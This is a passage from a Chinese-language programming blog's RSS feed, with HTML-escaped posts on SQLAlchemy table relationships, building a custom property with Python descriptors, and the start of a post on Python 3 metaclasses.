&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用&lt;code>gunicorn app.py --log-file=-&lt;/code>启动。&lt;/p></description></item><item><title>sqlalchemy 各种表关系</title><link>https://nnnewb.github.io/blog/p/sqlalchemy-%E5%90%84%E7%A7%8D%E8%A1%A8%E5%85%B3%E7%B3%BB/</link><pubDate>Fri, 01 Mar 2019 15:52:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/sqlalchemy-%E5%90%84%E7%A7%8D%E8%A1%A8%E5%85%B3%E7%B3%BB/</guid><description>&lt;h2 id="注意事项">注意事项&lt;/h2>
&lt;h3 id="foreignkey">ForeignKey&lt;/h3>
&lt;p>&lt;code>db.ForeginKey&lt;/code>的参数是&lt;code>&amp;lt;表名&amp;gt;.&amp;lt;键名&amp;gt;&lt;/code>，而不是&lt;code>&amp;lt;类名&amp;gt;.&amp;lt;字段名&amp;gt;&lt;/code>，务必注意这个区别。&lt;/p>
&lt;h3 id="back_populates-和-backref-在多对多关系中使用的区别">back_populates 和 backref 在多对多关系中使用的区别&lt;/h3>
&lt;p>&lt;code>back_populates&lt;/code>是更推荐的写法。&lt;/p>
&lt;p>多对多关系中使用&lt;code>backref&lt;/code>并指定了&lt;code>secondary&lt;/code>的话，另一张表关联的&lt;code>relationship&lt;/code>字段会使用相同的&lt;code>secondary&lt;/code>。&lt;/p>
&lt;p>&lt;code>back_populates&lt;/code>则需要在两张表的&lt;code>relationship&lt;/code>中都写上相同的&lt;code>secondary&lt;/code>中间表。&lt;/p>
&lt;h3 id="可调用的-secondary">可调用的 secondary&lt;/h3>
&lt;p>&lt;code>secondary&lt;/code>参数可以是一个可调用对象，做一些 trick 的时候应该有用。姑且记下。&lt;/p>
&lt;h2 id="一对多关系">一对多关系&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">class&lt;/span> &lt;span class="nc">Parent&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Base&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">__tablename__&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;parent&amp;#39;&lt;/span>
&lt;span class="nb">id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Column&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Integer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">primary_key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">child&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">relationship&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Child&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">back_populates&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;parent&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">Child&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Base&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">__tablename__&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;child&amp;#39;&lt;/span>
&lt;span class="nb">id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Column&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Integer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">primary_key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">parent_id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Column&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Integer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ForeignKey&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;parent.id&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="n">parent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">relationship&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Parent&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">back_populates&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;child&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>parent&lt;/code>包含多个&lt;code>child&lt;/code>的一对多关系。&lt;code>child&lt;/code>里写&lt;code>ForeignKey&lt;/code>为&lt;code>parent&lt;/code>的主键，&lt;code>child&lt;/code>里写&lt;code>relationship&lt;/code>，&lt;code>parent&lt;/code>里同样写&lt;code>relationship&lt;/code>，&lt;code>back_populates&lt;/code>填充上，完事。&lt;/p>
&lt;h2 id="一对一关系">一对一关系&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">class&lt;/span> &lt;span class="nc">Parent&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Base&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">__tablename__&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;parent&amp;#39;&lt;/span>
&lt;span class="nb">id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Column&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Integer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">primary_key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">child&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">relationship&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Child&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">uselist&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">False&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">back_populates&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;parent&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">Child&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Base&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">__tablename__&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;child&amp;#39;&lt;/span>
&lt;span class="nb">id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Column&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Integer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">primary_key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">parent_id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Column&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Integer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ForeignKey&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;parent.id&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="n">parent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">relationship&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Parent&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">back_populates&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;child&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>一对一关系中&lt;code>parent&lt;/code>需要在&lt;code>relationship&lt;/code>里加入参数&lt;code>uselist&lt;/code>，其他相同，完事儿。&lt;/p>
&lt;h2 id="多对多关系">多对多关系&lt;/h2>
&lt;p>多对多关系需要一个中间表。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">association_table&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Table&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;association&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Base&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">metadata&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="n">Column&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;left_id&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Integer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ForeignKey&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;left.id&amp;#39;&lt;/span>&lt;span class="p">)),&lt;/span>
&lt;span class="n">Column&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;right_id&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Integer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ForeignKey&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;right.id&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">Parent&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Base&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">__tablename__&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;left&amp;#39;&lt;/span>
&lt;span class="nb">id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Column&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Integer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">primary_key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">children&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">relationship&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s2">&amp;#34;Child&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="n">secondary&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">association_table&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="n">back_populates&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;parents&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">Child&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Base&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">__tablename__&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;right&amp;#39;&lt;/span>
&lt;span class="nb">id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Column&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Integer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">primary_key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">parents&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">relationship&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s2">&amp;#34;Parent&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="n">secondary&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">association_table&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="n">back_populates&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;children&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>中间表里写上&lt;code>parent&lt;/code>和&lt;code>child&lt;/code>的主键作为&lt;code>foreignkey&lt;/code>，&lt;code>parent&lt;/code>和&lt;code>child&lt;/code>里的&lt;code>relationship&lt;/code>加入参数&lt;code>secondary&lt;/code>，指定为中间表。&lt;/p></description></item><item><title>利用 descriptor 实现自己的 property</title><link>https://nnnewb.github.io/blog/p/%E5%88%A9%E7%94%A8-descriptor-%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84-property/</link><pubDate>Thu, 21 Feb 2019 17:53:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E5%88%A9%E7%94%A8-descriptor-%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84-property/</guid><description>&lt;h2 id="1概念简介">1.概念简介&lt;/h2>
&lt;h3 id="11-property">1.1 property&lt;/h3>
&lt;p>在 python 代码中，property 是非常常见的一个内置函数。property 可以为一个 python 类的 attribute 设置 getter/setter，可以类比之 C# 的 &lt;a class="link" href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/language-specification/classes#properties" target="_blank" rel="noopener"
>properties&lt;/a>。&lt;/p>
&lt;p>见下面的例子。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">class&lt;/span> &lt;span class="nc">A&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="fm">__init__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">a&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;span class="nd">@property&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">hello&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">a&lt;/span>
&lt;span class="nd">@hello&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">setter&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">hell&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">a&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">value&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">A&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hello&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># output:&lt;/span>
&lt;span class="c1"># 1&lt;/span>
&lt;span class="n">obj&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">A&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="n">obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hello&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;hello world&amp;#34;&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hello&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># output:&lt;/span>
&lt;span class="c1"># hello world&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="12-descriptor">1.2 descriptor&lt;/h3>
&lt;p>python 中的 descriptor 指的是实现了&lt;code>__get__&lt;/code>、&lt;code>__set__&lt;/code>、&lt;code>__delete__&lt;/code>三个方法之一的类。&lt;/p>
&lt;p>当一个 descriptor 类的实例作为其他类的成员时，通过&lt;code>obj.attr&lt;/code>语法访问该实例将会调用 descriptor 实例的&lt;code>__get__&lt;/code>方法。同理，&lt;code>__set__&lt;/code>和&lt;code>__delete__&lt;/code>也是相似的逻辑。&lt;/p>
&lt;p>先看个例子。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">class&lt;/span> &lt;span class="nc">DescriptorClass&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="fm">__get__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">instance&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">owner&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">owner&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="s1">&amp;#39;some value&amp;#39;&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">SomeClass&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">some_attr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">DescriptorClass&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">SomeClass&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">some_attr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># output:&lt;/span>
&lt;span class="c1"># &amp;lt;__main__.DescriptorClass object at 0x0000027AAE777160&amp;gt;&lt;/span>
&lt;span class="c1"># &amp;lt;__main__.SomeClass object at 0x0000027AAE777198&amp;gt;&lt;/span>
&lt;span class="c1"># &amp;lt;class &amp;#39;__main__.SomeClass&amp;#39;&amp;gt;&lt;/span>
&lt;span class="c1"># some value&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="2-实现">2. 实现&lt;/h2>
&lt;p>property 的逻辑在于，&lt;strong>当实例访问这个属性时，调用方法&lt;/strong>。descriptor 刚好处在那个正确的位置上。&lt;/p>
&lt;p>看代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">class&lt;/span> &lt;span class="nc">PropertyDescriptor&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="fm">__init__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">fn&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getter&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fn&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="fm">__get__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">instance&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">owner&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="fm">__set__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">instance&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">setter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">setter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">func&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">setter&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">func&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="bp">self&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">my_property&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">func&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">PropertyDescriptor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">func&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">SimpleClass&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nd">@my_property&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">simple_attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="s1">&amp;#39;a simple property&amp;#39;&lt;/span>
&lt;span class="nd">@simple_attr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">setter&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">simple_attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;simple attr setter&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">SimpleClass&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">simple_attr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">SimpleClass&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">simple_attr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;something&amp;#39;&lt;/span>
&lt;span class="c1"># output:&lt;/span>
&lt;span class="c1"># a simple property&lt;/span>
&lt;span class="c1"># simple attr setter&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="3-总结">3. 总结&lt;/h2>
&lt;blockquote>
&lt;p>个人看法，谨慎参考&lt;/p>
&lt;/blockquote>
&lt;p>descriptor 避免了重复编写&lt;code>getter&lt;/code>和&lt;code>setter&lt;/code>方法，非常直觉的一种用途就是类似于&lt;code>SQLAlchemy&lt;/code>这样的 ORM 框架的的字段映射。不需要为每一个特定类型的字段在基类或元类里编写大量样板代码。&lt;/p>
&lt;p>但这种设计是侵入式的（需要修改目标类的代码），而且非常不直观。在合适的地方使用相信可以有其发光发热的空间。&lt;/p>
&lt;p>对可读性来讲，结合元类，这俩被一起滥用的话对维护者而言完全是地狱吧&amp;hellip;&lt;/p></description></item><item><title>python3元类深入解读</title><link>https://nnnewb.github.io/blog/p/python3%E5%85%83%E7%B1%BB%E6%B7%B1%E5%85%A5%E8%A7%A3%E8%AF%BB/</link><pubDate>Thu, 20 Dec 2018 19:46:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/python3%E5%85%83%E7%B1%BB%E6%B7%B1%E5%85%A5%E8%A7%A3%E8%AF%BB/</guid><description>&lt;h2 id="0-intro">0. intro&lt;/h2>
&lt;p>元类是 python 里被说烂了的一个东西，然而日常用到的地方实在不多，每次想到都得查一下谷歌，想想干脆在博客留个笔记好了。&lt;/p>
&lt;p>元类的主要用途是定制&lt;strong>类&lt;/strong>的产生过程，以便于根据类声明包含的信息来创建出不同的类。&lt;/p>
&lt;h2 id="1-type">1. type&lt;/h2>
&lt;p>提到元类不得不说一下 python 的类型系统。&lt;/p>
&lt;p>python 的 class 也被视作一个对象，定制一个 class 的构造过程其实就和平时在 class 定义里写&lt;code>__init__&lt;/code>没啥区别。&lt;/p>
&lt;p>python3 里类的类型是&lt;code>type&lt;/code>，&lt;code>type&lt;/code>又继承自&lt;code>object&lt;/code>，&lt;code>object&lt;/code>的父类是自己，构成一个奇怪的闭环。其中，&lt;code>type&lt;/code>本身是一个特殊的类，他是自己的实例。&lt;/p>
&lt;pre>&lt;code class="language-mermaid" data-lang="mermaid">graph TB;
type --&amp;gt; |inherite|object;
type --&amp;gt; |instance-of| type;
object --&amp;gt; |instance-of|type;
other-cls --&amp;gt; |instance-of| type;
other-cls --&amp;gt; |inherite| object;
other-cls-instance --&amp;gt; |instance-of|other-cls;
&lt;/code>&lt;/pre>&lt;p>&lt;code>type&lt;/code>有两种调用方式，一种是最常用的接受一个对象参数，返回该对象的类型，另一种是不怎么常用的，直接创建一个新的类型。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># usage with one argument&lt;/span>
&lt;span class="nb">type&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">object&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># 返回对象的类型，这里返回的是 `type`&lt;/span>
&lt;span class="c1"># usage with three arguments&lt;/span>
&lt;span class="nb">type&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bases&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">attr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># 返回新创建的类型&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="2-meta-class">2. meta class&lt;/h2>
&lt;p>元类语法如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">class&lt;/span> &lt;span class="nc">MyClass&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">basecls1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">basecls2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">metaclass&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">MetaClass&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">named1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">arg&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">named2&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">arg&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>一般的元类可以是一个真正的&lt;code>class&lt;/code>或者一个函数。&lt;/p>
&lt;p>以函数为例：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">def&lt;/span> &lt;span class="nf">meta_f&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bases&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">attr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">type&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bases&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">attr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">A&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">metaclass&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">meta_f&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>以类为例：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">class&lt;/span> &lt;span class="nc">MetaC&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">type&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="fm">__new__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mcs&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bases&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">attr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">type&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="fm">__new__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mcs&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bases&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">attr&lt;/span>&lt;span class="p">)&lt;/span>
